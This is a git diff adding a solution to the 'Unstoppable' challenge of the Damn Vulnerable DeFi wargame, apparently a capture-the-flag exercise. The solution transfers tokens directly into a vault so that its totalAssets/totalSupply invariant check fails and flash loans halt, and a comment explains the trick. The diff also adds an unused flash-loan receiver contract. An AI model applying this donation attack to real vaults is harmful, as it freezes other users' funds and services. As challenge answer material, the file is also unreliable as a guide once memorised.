@@ -4,8 +4,9 @@ pragma solidity =0.8.25;
 
 import {Test, console} from "forge-std/Test.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
-import {UnstoppableVault, Owned} from "../../src/unstoppable/UnstoppableVault.sol";
+import {UnstoppableVault, Owned, ERC20} from "../../src/unstoppable/UnstoppableVault.sol";
 import {UnstoppableMonitor} from "../../src/unstoppable/UnstoppableMonitor.sol";
+import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
 
 contract UnstoppableChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -90,9 +91,14 @@ contract UnstoppableChallenge is Test {
 
     /**
      * CODE YOUR SOLUTION HERE
+     * 
+     * We do some donation with the 10 tokens we have, as the function flashloan() has a check that
+     * the totalAssets() has to be equal to totalSupply() it fails because when I tranfer directly
+     * some funds to the contract as the totalAssets() is taking it as the balance of the contract, then
+     * the totalSupply() = 1_000_000 and totalAssets() = 1_000_010 so the protocol stopped to give flashloans.
      */
     function test_unstoppable() public checkSolvedByPlayer {
-        
+        token.transfer(address(vault), INITIAL_PLAYER_TOKEN_BALANCE);
     }
 
     /**
@@ -109,4 +115,31 @@ contract UnstoppableChallenge is Test {
         assertTrue(vault.paused(), "Vault is not paused");
         assertEq(vault.owner(), deployer, "Vault did not change owner");
     }
+}
+
+
+contract FlaashloanReceiver is IERC3156FlashBorrower {
+    UnstoppableVault immutable vault;
+
+    error UnexpectedFlashLoan();
+
+    constructor(address _vault) {
+        vault = UnstoppableVault(_vault);
+    }
+
+
+    function onFlashLoan(address initiator, address token, uint256 amount, uint256 fee, bytes calldata)
+        external
+        returns (bytes32)
+    {
+        if (initiator != address(this) || msg.sender != address(vault) || token != address(vault.asset()) || fee != 0) {
+            revert UnexpectedFlashLoan();
+        }
+
+        ERC20(token).approve(address(vault), amount);
+
+        return keccak256("IERC3156FlashBorrower.onFlashLoan");
+    }
+
+
 }
